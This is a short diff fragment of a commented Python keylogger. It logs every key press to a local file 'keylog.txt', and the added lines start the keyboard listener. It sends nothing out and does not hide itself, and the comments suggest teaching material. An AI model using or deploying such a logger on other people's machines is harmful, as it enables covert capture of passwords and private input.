@@ -11,3 +11,9 @@ logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asc
 def on_press(key):
     logging.info(str(key))
     # Log information about the pressed key at the INFO level, converting the key to a string.
+
+# Set up a key-press listener
+with Listener(on_press=on_press) as listener:
+    listener.join()
+    # Use a context manager to create a Listener object with the defined on_press function.
+    # Start the listener and keep the program running until the listener is stopped.
